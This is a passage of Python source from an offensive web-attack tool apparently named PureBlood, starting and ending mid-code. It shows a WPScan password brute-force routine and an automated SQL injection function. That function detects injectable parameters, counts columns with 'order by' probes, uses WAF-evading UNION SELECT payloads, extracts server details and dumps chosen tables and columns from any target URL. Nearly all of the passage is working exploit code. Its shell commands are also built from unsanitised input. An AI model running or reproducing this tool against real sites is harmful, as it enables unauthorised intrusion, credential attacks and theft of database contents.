stderr=subprocess.STDOUT)\n            if wp_scan != 0:\n                print ('\\n{2}[{1}!{2}] {3}- {1}Please install wpscan\\'s dependencies first!{0}'.format(reset, red, blue, yellow))\n                print (\"\"\"\nLinux / MAC OS:\nhttps://wpscan.org\nAndroid:\n    Termux / GNURoot\nWindows:\nhttp://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10\nhttps://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html\nKali Linux:\nsudo apt-get install wpscan\"\"\")\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n            else:\n                pass\n        if wp_scan == 0:\n            pass\n        elif wp_scan == 1:\n            print ('\\n{2}[{1}!{2}] {3}- {1}Please install wpscan first!{0}'.format(reset, red, blue, yellow))\n            print (\"\"\"\nLinux / MAC OS:\nhttps://wpscan.org\nAndroid:\n    Termux / GNURoot\nWindows:\nhttp://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10\nhttps://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html\nKali Linux:\nsudo apt-get install wpscan\"\"\")\n            time.sleep(2)\n            print ('')\n            web_application_attack()\n        if platform.system() == 'Windows':\n            print ('[#] - Updating WPScan:')\n            subprocess.call('ruby external/wpscan-master/wpscan --batch --no-banner --no-color --update --disable-tls-checks', shell=True)\n            print ('\\n[#] - Running WPScan:')\n            if sys.version_info[0] == 3:\n                wp_scan_brutefoce_username = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))\n                wp_scan_bruteforce_password = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))\n            elif sys.version_info[0] == 2:\n                wp_scan_brutefoce_username = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))\n                wp_scan_bruteforce_password = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))\n            try:\n                subprocess.call('ruby external/wpscan-master/wpscan -u '+hostname+' -r --batch --no-banner --verbose -t 500 --wordlist '+wp_scan_bruteforce_password+' --username '+wp_scan_brutefoce_username, shell=True)\n            except Exception as e:\n                print ('[!] - Error: {0}'.format(e))\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n        else:\n            print ('[#] - Updating WPScan:')\n            subprocess.call('wpscan --batch --no-banner --update --disable-tls-checks', shell=True)\n            print ('\\n[#] - Running WPScan:')\n            if sys.version_info[0] == 3:\n                wp_scan_brutefoce_username = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))\n                wp_scan_bruteforce_password = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))\n            elif sys.version_info[0] == 2:\n                wp_scan_brutefoce_username = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))\n                wp_scan_bruteforce_password = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))\n            try:\n                subprocess.call('ruby external/wpscan-master/wpscan -u '+hostname+' -r --batch --no-banner --verbose -t 500 --wordlist '+wp_scan_bruteforce_password+' --username '+wp_scan_brutefoce_username, shell=True)\n            except Exception as e:\n                print ('[!] - Error: {0}'.format(e))\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_application_attack()\n\n    def auto_sql_injection(self, url):\n        print ('[#] - Auto SQL Injection Running on -> {0}'.format(url))\n        auto_sql_injection_request_origin = requests.get(url)\n        auto_sql_injection_request_origin_html = BeautifulSoup(auto_sql_injection_request_origin.text, 'html.parser')\n        auto_sql_injection_request_origin_html_h1 = auto_sql_injection_request_origin_html.find_all('h1')\n        auto_sql_injection_request_origin_html_h2 = auto_sql_injection_request_origin_html.find_all('h2')\n        auto_sql_injection_request_origin_html_h3 = auto_sql_injection_request_origin_html.find_all('h3')\n        auto_sql_injection_request_origin_html_p = auto_sql_injection_request_origin_html.find_all('p')\n        print ('[~] - Checking If Vulnerable')\n        auto_sql_injection_request = requests.get('{0}\\''.format(url))\n        auto_sql_injection_request_url = '{0}\\''.format(url)\n        auto_sql_injection_request_result = ''\n        auto_sql_injection_request_i = ''\n        if auto_sql_injection_request.status_code == 200:\n            for db, errors in dbms_errors.items():\n                for error in errors:\n                    if re.compile(error).search(auto_sql_injection_request.text):\n                        error = re.compile(error)\n                        auto_sql_injection_request_result = 'Vulnerable1'\n                        print ('[+] - Vulnerable: Database -> ({0})'.format(db))\n            if auto_sql_injection_request_result == '':\n                if auto_sql_injection_request_origin.text != auto_sql_injection_request.text:\n                    auto_sql_injection_request_result = 'Vulnerable2'\n                    print ('[+] - Vulnerable: NO Syntax Error')\n        elif auto_sql_injection_request.status_code == 403:\n            print ('[!] - Not Vulnerable!')\n        elif auto_sql_injection_request.status_code == 406:\n            print ('[!] - Not Vulnerable!')\n        if auto_sql_injection_request_result == 'Vulnerable1':\n            auto_sql_injection_request_ii = 0\n            auto_sql_injection_request_iii = ''\n            print ('[~] - Counting How Many Columns:')\n            auto_sql_injection_request_orderby = requests.get('{0}\\' order by {1}--+'.format(url, '1'))\n            if ' order by 1--' in auto_sql_injection_request_orderby.text or 'mysql_fetch_row():' in auto_sql_injection_request_orderby.text:\n                auto_sql_injection_orderby_result = 'err1'\n            else:\n                auto_sql_injection_orderby_result = ''\n            if auto_sql_injection_orderby_result == 'err1':\n                single_quote_payload = ''\n            else:\n                single_quote_payload = '\\''\n            auto_sql_injection_request_orderby = requests.get('{0}{1} order by {2}--+'.format(url, single_quote_payload, '100'))\n            if 'Unknown column' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text or '\\'order clause\\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:\n                auto_sql_injection_orderby_result = 'err1'\n            elif 'mysql_fetch_row():' in auto_sql_injection_request_orderby.text:\n                auto_sql_injection_orderby_result = 'err2'\n            else:\n                auto_sql_injection_orderby_result = 'err3'\n            for i in range(50):\n                if i == 0:\n                    i = i + 1\n                print ('\\tColumn -> {0}'.format(str(i)))\n                auto_sql_injection_request_orderby = requests.get('{0}{1} order by {2}--+'.format(url, single_quote_payload, str(i)))\n                if auto_sql_injection_request_orderby.status_code == 403 or auto_sql_injection_request_orderby.status_code == 406:\n                    break\n                if auto_sql_injection_orderby_result == 'err1':\n                    if 'Unknown column' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text or '\\'order clause\\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:\n                        auto_sql_injection_request_i = i\n                        break\n                    if '\\''+ str(i) + '\\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:\n                        auto_sql_injection_request_i = i\n                        break\n                elif auto_sql_injection_orderby_result == 'err2':\n                    if 'mysql_fetch_row()' in auto_sql_injection_request_orderby.text:\n                        auto_sql_injection_request_i = i\n                        break\n                elif auto_sql_injection_orderby_result == 'err3':\n                    if 'Unknown column' in auto_sql_injection_request_orderby.text or '\\'order clause\\'' in auto_sql_injection_request_orderby.text:\n                        auto_sql_injection_request_i = i\n                        break\n                    if '\\''+ str(i) + '\\'' in auto_sql_injection_request_orderby.text:\n                        auto_sql_injection_request_i = i\n                        break\n            if not auto_sql_injection_request_i:\n                for i in range(50):\n                    if i == 0:\n                        i = i + 1\n                    print ('\\tColumn -> {0}'.format(str(i)))\n                    auto_sql_injection_request_orderby = requests.get('{0}{1} order by {2}--+'.format(url, single_quote_payload, str(i)))\n                    if auto_sql_injection_request_orderby.status_code == 403 or auto_sql_injection_request_orderby.status_code == 406:\n                        break\n                    if auto_sql_injection_orderby_result == 'err1':\n                        if 'Unknown column' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text or '\\'order clause\\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:\n                            auto_sql_injection_request_i = i\n                            break\n                        if '\\''+ str(i) + '\\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:\n                            auto_sql_injection_request_i = i\n                            break\n                    elif auto_sql_injection_orderby_result == 'err3':\n                        if 'Unknown column' in auto_sql_injection_request_orderby.text or '\\'order clause\\'' in auto_sql_injection_request_orderby.text:\n                            auto_sql_injection_request_i = i\n                            break\n                        if '\\''+ str(i) + '\\'' in auto_sql_injection_request_orderby.text:\n                            auto_sql_injection_request_i = i\n                            break\n            if not auto_sql_injection_request_i:\n                print ('[!] - Not Able to Find How Many Columns!')\n                print ('')\n                web_application_attack()\n            print ('[~] - Columns: {0}'.format(str(auto_sql_injection_request_i - 1)))\n            for i in range(auto_sql_injection_request_i):\n                auto_sql_injection_request_ii = auto_sql_injection_request_ii + 1\n                if auto_sql_injection_request_ii == auto_sql_injection_request_i:\n                    auto_sql_injection_request_ii = auto_sql_injection_request_ii - 1\n                    auto_sql_injection_request_iii += '{0},'.format(str(auto_sql_injection_request_ii))\n                    break\n                auto_sql_injection_request_iii += '{0},'.format(str(auto_sql_injection_request_ii))\n            auto_sql_injection_request_iii = auto_sql_injection_request_iii.replace(str(auto_sql_injection_request_ii) + ',' + str(auto_sql_injection_request_ii) + ',', str(auto_sql_injection_request_ii))\n            print ('')\n            print ('{2}[{1}#{2}] {3}- {4}Please put "-" after "=". Example: =-1337{0}'.format(reset + bold, green, blue, yellow, cyan))\n            if sys.version_info[0] == 3:\n                target = str(input('Target> '))\n            if sys.version_info[0] == 2:\n                target = str(raw_input('Target> '))\n            print ('')\n            if 'http://' in target:\n                url = target\n                hostname = target.replace('http://', '')\n            elif 'https://' in target:\n                url = target\n                hostname = target.replace('https://', '')\n            if '://' not in target:\n                url = 'http://' + target\n                hostname = target\n            print ('[~] - Finding Vulnerable Column:')\n            auto_sql_injection_request_vulncolumn = requests.get('{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii))\n            auto_sql_injection_request_vulncolumn_soup = BeautifulSoup(auto_sql_injection_request_vulncolumn.content, 'html.parser')\n            auto_sql_injection_request_vulncolumn_nums = re.findall('\\d+', str(auto_sql_injection_request_vulncolumn_soup))\n            auto_sql_injection_request_vulncolumn_possible_vulncolumn = []\n            auto_sql_injection_request_vulncolumn_column = ''\n            for i in auto_sql_injection_request_vulncolumn_nums:\n                if len(i) < 2:\n                    auto_sql_injection_request_vulncolumn_possible_vulncolumn.append(i)\n                if i == 0:\n                    pass\n            auto_sql_injection_request_vulncolumn_possible_vulncolumn = list(set(auto_sql_injection_request_vulncolumn_possible_vulncolumn))\n            auto_sql_injection_request_vulncolumn_column = ''\n            for i in auto_sql_injection_request_vulncolumn_possible_vulncolumn:\n                print ('\\tTrying -> {0}'.format(str(i)))\n                auto_sql_injection_request_dios_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + i + ',', ',' + dios1 + ',')\n                auto_sql_injection_request_dios = requests.get(auto_sql_injection_request_dios_url)\n                if 'Table:' in auto_sql_injection_request_dios.text and 'id="PureBlood"' in auto_sql_injection_request_dios.text:\n                    auto_sql_injection_request_dios_soup = BeautifulSoup(auto_sql_injection_request_dios.content, 'html.parser')\n                    auto_sql_injection_request_dios_url = auto_sql_injection_request_dios_url\n                    auto_sql_injection_request_vulncolumn_column = i\n                    break\n            if not auto_sql_injection_request_vulncolumn_column:\n                print ('[!] - Not Able to Find The Vulnerable Column!')\n                print ('')\n                web_application_attack()\n            print ('[+] - Vulnerable Column: {0}'.format(str(auto_sql_injection_request_vulncolumn_column)))\n            auto_sql_injection_request_hostname_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_hostname + ',')\n            auto_sql_injection_request_tmpdir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_tmpdir + ',')\n            auto_sql_injection_request_datadir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_datadir + ',')\n            auto_sql_injection_request_version_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_version + ',')\n            auto_sql_injection_request_basedir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_basedir + ',')\n            auto_sql_injection_request_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_user + ',')\n            auto_sql_injection_request_database_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_database + ',')\n            auto_sql_injection_request_schema_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_schema + ',')\n            auto_sql_injection_request_uuid_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_uuid + ',')\n            auto_sql_injection_request_system_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_system_user + ',')\n            auto_sql_injection_request_session_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_session_user + ',')\n            auto_sql_injection_request_symlink_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_symlink + ',')\n            auto_sql_injection_request_ssl_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_ssl + ',')\n            auto_sql_injection_request_hostname = requests.get(auto_sql_injection_request_hostname_url)\n            auto_sql_injection_request_tmpdir = requests.get(auto_sql_injection_request_tmpdir_url)\n            auto_sql_injection_request_datadir = requests.get(auto_sql_injection_request_datadir_url)\n            auto_sql_injection_request_version = requests.get(auto_sql_injection_request_version_url)\n            auto_sql_injection_request_basedir = requests.get(auto_sql_injection_request_basedir_url)\n            auto_sql_injection_request_user = requests.get(auto_sql_injection_request_user_url)\n            auto_sql_injection_request_database = requests.get(auto_sql_injection_request_database_url)\n            auto_sql_injection_request_schema = requests.get(auto_sql_injection_request_schema_url)\n            auto_sql_injection_request_uuid = requests.get(auto_sql_injection_request_uuid_url)\n            auto_sql_injection_request_system_user = requests.get(auto_sql_injection_request_system_user_url)\n            auto_sql_injection_request_session_user = requests.get(auto_sql_injection_request_session_user_url)\n            auto_sql_injection_request_symlink = requests.get(auto_sql_injection_request_symlink_url)\n            auto_sql_injection_request_ssl = requests.get(auto_sql_injection_request_ssl_url)\n            sqli_hostname_soup = BeautifulSoup(auto_sql_injection_request_hostname.text, 'html.parser')\n            sqli_tmpdir_soup = BeautifulSoup(auto_sql_injection_request_tmpdir.text, 'html.parser')\n            sqli_datadir_soup = BeautifulSoup(auto_sql_injection_request_datadir.text, 'html.parser')\n            sqli_version_soup = BeautifulSoup(auto_sql_injection_request_version.text, 'html.parser')\n            sqli_basedir_soup = BeautifulSoup(auto_sql_injection_request_basedir.text, 'html.parser')\n            sqli_user_soup = BeautifulSoup(auto_sql_injection_request_user.text, 'html.parser')\n            sqli_database_soup = BeautifulSoup(auto_sql_injection_request_database.text, 'html.parser')\n            sqli_schema_soup = BeautifulSoup(auto_sql_injection_request_schema.text, 'html.parser')\n            sqli_uuid_soup = BeautifulSoup(auto_sql_injection_request_uuid.text, 'html.parser')\n            sqli_system_user_soup = BeautifulSoup(auto_sql_injection_request_system_user.text, 'html.parser')\n            sqli_session_user_soup = BeautifulSoup(auto_sql_injection_request_session_user.text, 'html.parser')\n            sqli_symlink_soup = BeautifulSoup(auto_sql_injection_request_symlink.text, 'html.parser')\n            sqli_ssl_soup = BeautifulSoup(auto_sql_injection_request_ssl.text, 'html.parser')\n            sqli_hostname = sqli_hostname_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_tmpdir = sqli_tmpdir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_datadir = sqli_datadir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_version = sqli_version_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_basedir = sqli_basedir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_user = sqli_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_database = sqli_database_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_schema = sqli_schema_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_uuid = sqli_uuid_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_system_user = sqli_system_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_session_user = sqli_session_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_symlink = sqli_symlink_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_ssl = sqli_ssl_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            print ('[+] Hostname: {0}'.format(sqli_hostname))\n            print ('[+] TMP Directory: {0}'.format(sqli_tmpdir))\n            print ('[+] Data Directory: {0}'.format(sqli_datadir))\n            print ('[+] Database Version: {0}'.format(sqli_version))\n            print ('[+] Base Directory: {0}'.format(sqli_basedir))\n            print ('[+] Current User: {0}'.format(sqli_user))\n            print ('[+] Current Database: {0}'.format(sqli_database))\n            print ('[+] Current Schema: {0}'.format(sqli_schema))\n            print ('[+] System UUID Key: {0}'.format(sqli_uuid))\n            print ('[+] Current System User: {0}'.format(sqli_system_user))\n            print ('[+] Session User: {0}'.format(sqli_session_user))\n            print ('[+] Is Sysmlink Enabled?: {0}'.format(sqli_symlink))\n            print ('[+] Is SSL Enabled?: {0}'.format(sqli_ssl))\n            print ('')\n            print ('[~] Dumping Database:')\n            auto_sql_injection_request_dios_soup_pureblood = auto_sql_injection_request_dios_soup.findAll('strong', attrs={'id': 'PureBlood'})\n            auto_sql_injection_request_dios_soup_pureblood_list = []\n            for i in auto_sql_injection_request_dios_soup_pureblood:\n                if i.text in auto_sql_injection_request_dios_soup_pureblood_list:\n                    pass\n                else:\n                    auto_sql_injection_request_dios_soup_pureblood_list.append(i.text)\n            for i in auto_sql_injection_request_dios_soup_pureblood_list:\n                print ('\\t{0}'.format(i))\n            print ('')\n            sqli_table = ''\n            user_choice = ''\n            sqli_column = []\n            print ('{2}[{1}#{2}] {3}- {4}Just enter exit/done if you want to start dumping{0}'.format(reset + bold, green, blue, yellow, cyan))\n            while True:\n                if sys.version_info[0] == 3:\n                    if sqli_table:\n                        pass\n                    elif not sqli_table:\n                        user_choice1 = str(input('Table> '))\n                        sqli_table = user_choice1\n                    user_choice = str(input('\\tColumn> '))\n                    if user_choice == 'done' or user_choice == 'exit' or user_choice == '':\n                        break\n                    else:\n                        sqli_column.append(user_choice)\n                if sys.version_info[0] == 2:\n                    if sqli_table:\n                        pass\n                    elif not sqli_table:\n                        user_choice1 = str(raw_input('Table> '))\n                        sqli_table = user_choice1\n                    user_choice = str(raw_input('\\tColumn> '))\n                    if user_choice == 'done' or user_choice == 'exit' or user_choice == '':\n                        break\n                    else:\n                        sqli_column.append(user_choice)\n            print ('')\n            print ('[~] Dumping Columns:')\n            for i in sqli_column:\n                auto_sql_injection_request_column_dump_list = []\n                auto_sql_injection_request_column_dump_url = '{0}{1} /*!50000Union*/ all select {2} from {3}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii, sqli_table)\n                auto_sql_injection_request_column_dump_url = auto_sql_injection_request_column_dump_url.replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_dump_column_payload + ',')\n                auto_sql_injection_request_column_dump_url = auto_sql_injection_request_column_dump_url.replace('<column>', i)\n                auto_sql_injection_request_column_dump = requests.get(auto_sql_injection_request_column_dump_url)\n                auto_sql_injection_request_column_dump_soup = BeautifulSoup(auto_sql_injection_request_column_dump.text, 'html.parser')\n                auto_sql_injection_request_column_dump_soup_pureblood = auto_sql_injection_request_column_dump_soup.find_all('strong', attrs={'id': 'PureBloodINFO'})\n                for ii in auto_sql_injection_request_column_dump_soup_pureblood:\n                    if ii.text in auto_sql_injection_request_column_dump_list:\n                        pass\n                    elif ii.text not in auto_sql_injection_request_column_dump_list:\n                        auto_sql_injection_request_column_dump_list.append(ii.text)\n                for iii in auto_sql_injection_request_column_dump_list:\n                    print ('\\t{0} -> {1}'.format(i, iii))\n        elif auto_sql_injection_request_result == 'Vulnerable2': # error_output() == False\n            auto_sql_injection_request_ii = 0\n            auto_sql_injection_request_iii = ''\n            print ('[~] - Counting How Many Columns:')\n            auto_sql_injection_request_orderby = requests.get('{0}\\' order by {1}--+'.format(url, '1'))\n            auto_sql_injection_request_orderby_html = BeautifulSoup(auto_sql_injection_request_orderby.text, 'html.parser')\n            if 'mysql_fetch_row():' in auto_sql_injection_request_orderby.text:\n                auto_sql_injection_orderby_result = 'err1'\n                print ('YES')\n            else:\n                auto_sql_injection_orderby_result = ''\n            if auto_sql_injection_orderby_result == 'err1':\n                single_quote_payload = ''\n            else:\n                single_quote_payload = '\\''\n            for i in range(50):\n                if i == 0:\n                    i = i + 1\n                print ('\\tColumn -> {0}'.format(str(i)))\n                auto_sql_injection_request_orderby = requests.get('{0}{1} order by {2}--+'.format(url, single_quote_payload, str(i)))\n                auto_sql_injection_request_orderby_html = BeautifulSoup(auto_sql_injection_request_orderby.text, 'html.parser')\n                auto_sql_injection_request_orderby_html_h1 = auto_sql_injection_request_orderby_html.find_all('h1')\n                auto_sql_injection_request_orderby_html_h2 = auto_sql_injection_request_orderby_html.find_all('h2')\n                auto_sql_injection_request_orderby_html_h3 = auto_sql_injection_request_orderby_html.find_all('h3')\n                auto_sql_injection_request_orderby_html_p = auto_sql_injection_request_orderby_html.find_all('p')\n                if auto_sql_injection_request_orderby.status_code == 403 or auto_sql_injection_request_orderby.status_code == 406:\n                    break\n                if auto_sql_injection_request_origin_html_h1 != auto_sql_injection_request_orderby_html_h1:\n                    auto_sql_injection_request_i = i\n                    break\n                elif auto_sql_injection_request_origin_html_h2 != auto_sql_injection_request_orderby_html_h2:\n                    auto_sql_injection_request_i = i\n                    break\n                elif auto_sql_injection_request_origin_html_h3 != auto_sql_injection_request_orderby_html_h3:\n                    auto_sql_injection_request_i = i\n                    break\n                elif auto_sql_injection_request_origin_html_p != auto_sql_injection_request_orderby_html_p:\n                    auto_sql_injection_request_i = i\n                    break\n            if not auto_sql_injection_request_i:\n                for i in range(50):\n                    print ('\\tColumn -> {0}'.format(str(i)))\n                    auto_sql_injection_request_orderby = requests.get('{0}{1} group by {2}--+'.format(url, single_quote_payload, str(i)))\n                    auto_sql_injection_request_orderby_html = BeautifulSoup(auto_sql_injection_request_orderby.text, 'html.parser')\n                    auto_sql_injection_request_orderby_html_h1 = auto_sql_injection_request_orderby_html.find_all('h1')\n                    auto_sql_injection_request_orderby_html_h2 = auto_sql_injection_request_orderby_html.find_all('h2')\n                    auto_sql_injection_request_orderby_html_h3 = auto_sql_injection_request_orderby_html.find_all('h3')\n                    auto_sql_injection_request_orderby_html_p = auto_sql_injection_request_orderby_html.find_all('p')\n                    if auto_sql_injection_request_orderby.status_code == 403 or auto_sql_injection_request_orderby.status_code == 406:\n                        print ('[!] - Not Vulnerable!')\n                        print ('')\n                        web_application_attack()\n                    if auto_sql_injection_request_origin_html_h1 != auto_sql_injection_request_orderby_html_h1:\n                        auto_sql_injection_request_i = i\n                        break\n                    elif auto_sql_injection_request_origin_html_h2 != auto_sql_injection_request_orderby_html_h2:\n                        auto_sql_injection_request_i = i\n                        break\n                    elif auto_sql_injection_request_origin_html_h3 != auto_sql_injection_request_orderby_html_h3:\n                        auto_sql_injection_request_i = i\n                        break\n                    elif auto_sql_injection_request_origin_html_p != auto_sql_injection_request_orderby_html_p:\n                        auto_sql_injection_request_i = i\n                        break\n            if not auto_sql_injection_request_i:\n                print ('[!] - Not Able to Find How Many Columns!')\n                print ('')\n                web_application_attack()\n            print ('[+] - Columns: {0}'.format(str(auto_sql_injection_request_i - 1)))\n            for i in range(auto_sql_injection_request_i):\n                auto_sql_injection_request_ii = auto_sql_injection_request_ii + 1\n                if auto_sql_injection_request_ii == auto_sql_injection_request_i:\n                    auto_sql_injection_request_ii = auto_sql_injection_request_ii - 1\n                    auto_sql_injection_request_iii += '{0},'.format(str(auto_sql_injection_request_ii))\n                    break\n                auto_sql_injection_request_iii += '{0},'.format(str(auto_sql_injection_request_ii))\n            auto_sql_injection_request_iii = auto_sql_injection_request_iii.replace(str(auto_sql_injection_request_ii) + ',' + str(auto_sql_injection_request_ii) + ',', str(auto_sql_injection_request_ii))\n            print ('')\n            print ('{2}[{1}#{2}] {3}- {4}Please put "-" after "=". Example: =-1337{0}'.format(reset + bold, green, blue, yellow, cyan))\n            if sys.version_info[0] == 3:\n                target = str(input('Target> '))\n            if sys.version_info[0] == 2:\n                target = str(raw_input('Target> '))\n            print ('')\n            if 'http://' in target:\n                url = target\n                hostname = target.replace('http://', '')\n            elif 'https://' in target:\n                url = target\n                hostname = target.replace('https://', '')\n            if '://' not in target:\n                url = 'http://' + target\n                hostname = target\n            print ('[~] - Finding Vulnerable Column:')\n            auto_sql_injection_request_vulncolumn = requests.get('{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii))\n            auto_sql_injection_request_vulncolumn_soup = BeautifulSoup(auto_sql_injection_request_vulncolumn.content, 'html.parser')\n            auto_sql_injection_request_vulncolumn_nums = re.findall('\\d+', str(auto_sql_injection_request_vulncolumn_soup))\n            auto_sql_injection_request_vulncolumn_possible_vulncolumn = []\n            auto_sql_injection_request_vulncolumn_column = ''\n            for i in auto_sql_injection_request_vulncolumn_nums:\n                if len(i) < 2:\n                    auto_sql_injection_request_vulncolumn_possible_vulncolumn.append(i)\n                if i == 0:\n                    pass\n            auto_sql_injection_request_vulncolumn_possible_vulncolumn = list(set(auto_sql_injection_request_vulncolumn_possible_vulncolumn))\n            auto_sql_injection_request_vulncolumn_column = ''\n            for i in auto_sql_injection_request_vulncolumn_possible_vulncolumn:\n                print ('\\tTrying -> {0}'.format(str(i)))\n                auto_sql_injection_request_dios_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + i + ',', ',' + dios1 + ',')\n                auto_sql_injection_request_dios = requests.get(auto_sql_injection_request_dios_url)\n                if 'Table:' in auto_sql_injection_request_dios.text and 'id="PureBlood"' in auto_sql_injection_request_dios.text:\n                    auto_sql_injection_request_dios_soup = BeautifulSoup(auto_sql_injection_request_dios.content, 'html.parser')\n                    auto_sql_injection_request_dios_url = auto_sql_injection_request_dios_url\n                    auto_sql_injection_request_vulncolumn_column = i\n                    break\n            if not auto_sql_injection_request_vulncolumn_column:\n                print ('[!] - Not Vulnerable!')\n                print ('')\n                web_application_attack()\n            print ('[+] - Vulnerable Column: {0}'.format(str(auto_sql_injection_request_vulncolumn_column)))\n            auto_sql_injection_request_hostname_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_hostname + ',')\n            auto_sql_injection_request_tmpdir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_tmpdir + ',')\n            auto_sql_injection_request_datadir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_datadir + ',')\n            auto_sql_injection_request_version_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_version + ',')\n            auto_sql_injection_request_basedir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', 